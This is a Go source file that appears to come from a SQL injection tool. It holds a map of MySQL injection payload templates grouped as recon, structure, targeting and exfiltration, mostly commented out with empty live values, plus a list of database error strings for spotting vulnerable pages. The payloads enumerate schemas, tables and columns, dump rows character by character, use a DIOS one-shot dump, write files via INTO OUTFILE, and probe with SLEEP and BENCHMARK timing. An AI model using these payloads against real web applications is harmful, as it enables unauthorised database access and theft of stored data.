package mysql

var Queries = map[string]string {
	"test": "",
	"blind_test": "(SELECT CASE WHEN",

	/// Recon
	"current_user": "",
	"current_version": "",

	/// Structure
	"db_name": "",
	//"db_name": "SELECT MID(IFNULL(CAST(schema_name AS NCHAR),0x20),%d,%d) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1",
	"db_count": "",
	//"db_count": "SELECT IFNULL(CAST(COUNT(schema_name) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA",
	"table_count": "",
	//"table_count": "SELECT IFNULL(CAST(COUNT(TABLE_NAME) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x%s",
	"table_name": "",
	//"table_name": "SELECT MID(IFNULL(CAST(TABLE_NAME AS NCHAR),0x20),%d,%d) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x%s LIMIT %d,1",
	"column_count": "",
	//"column_count": "SELECT IFNULL(CAST(COUNT(COLUMN_NAME) AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=0x%s AND TABLE_NAME=0x%s",
	"column_name": "",
	//"column_name": "SELECT MID(IFNULL(CAST(COLUMN_NAME AS NCHAR),0x20),%d,%d) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=0x%s AND TABLE_NAME=0x%s LIMIT %d,1",

	/// Targeting
	"table_count_with_column": "",
	//                    SELECT MID((IFNULL(CAST(COUNT(*) AS CHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE ('%%%s%%') AND TABLE_SCHEMA=0x%s
	"table_from_column": "",
	//                    SELECT MID((IFNULL(CAST(TABLE_NAME AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE ('%%%s%%') AND TABLE_SCHEMA=0x%s LIMIT %d,1
	"column_from_table": "",
	//                    SELECT MID((IFNULL(CAST(COLUMN_NAME AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x%s AND TABLE_SCHEMA=0x%s AND COLUMN_NAME LIKE ('%%%s%%') LIMIT 1
	"table_count_with_column_blacklist": "",
	"table_with_column_blacklist": "",
	"column_from_table_blacklist": "",

	// Exfil
	"row_count": "",
	//"row_count": "SELECT IFNULL(CAST(COUNT(*) AS NCHAR),0x20) FROM `%s`.`%s`",
	"dump_column": "",
	//"dump_column": "SELECT MID(IFNULL(CAST(%s AS NCHAR),0x20),%d,%d) FROM `%s`.`%s` ORDER BY `%s` LIMIT %d,1",
	"dump_multi_column": "",
	//"dump_multi_column": "SELECT MID((IFNULL(CAST(CONCAT(%s) AS NCHAR),0x20)),%d,%d) FROM `%s`.`%s` ORDER BY `%s` LIMIT %d,1",

	// Misc
	"dios": "",
	//"dios": "(select (@) from (select(@:=0x00),(select (@) from (%s) where (@)in (@:=concat(@,0x0D,0x%s,%s,0x%s))))a) ",
	"dump_file": "",
	//"dump_file": "0x%s INTO OUTFILE '%s'",
	"sleep": "",
	//"sleep": "SLEEP(%d)",
	"benchmark": "",
	//"benchmark": "BENCHMARK(50000000,MD5(0x53415178))",
}

var Flags = []string{
	"Fatal error:",
	"error in your SQL syntax",
	"mysql_num_rows()",
	"mysql_fetch_array()",
	"Error Occurred While Processing Request",
	"Server Error in '/' Application",
	"mysql_fetch_row()",
	"Syntax error",
	"mysql_fetch_assoc()",
	"mysql_fetch_object()",
	"mysql_numrows()",
	"GetArray()",
	"FetchRow()",
	"Input string was not in a correct format",
	"You have an error in your SQL syntax",
	"Warning: session_start()",
	"Warning: is_writable()",
	"Warning: Unknown()",
	"Warning: mysql_result()",
	"Warning: mysql_query()",
	"Warning: mysql_num_rows()",
	"Warning: array_merge()",
	"Warning: preg_match()",
	"SQL syntax error",
	"MYSQL error message: supplied argument….",
	"mysql error with query",
}

var SystemDBNames = []string{"information_schema", "mysql", "performance_schema", "sys"}